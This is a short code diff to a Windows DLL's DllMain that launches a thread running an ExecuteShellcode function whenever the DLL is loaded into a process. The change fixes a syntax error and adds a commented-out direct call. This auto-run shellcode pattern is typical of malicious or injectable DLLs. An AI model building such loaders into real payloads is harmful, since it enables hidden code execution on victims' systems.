@@ -30,7 +30,8 @@ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
 			break;
 		case DLL_PROCESS_ATTACH:
 			hAppInstance = hinstDLL;
-			CreateThread(NULL , 0, (LPTHREAD_START_ROUTINE)ExecuteShellcode, NULL, 0 NULL);
+			CreateThread(NULL , 0, (LPTHREAD_START_ROUTINE)ExecuteShellcode, NULL, 0 ,NULL);
+			// ExecuteShellcode();
 			break;
 		case DLL_PROCESS_DETACH:
 		case DLL_THREAD_ATTACH:
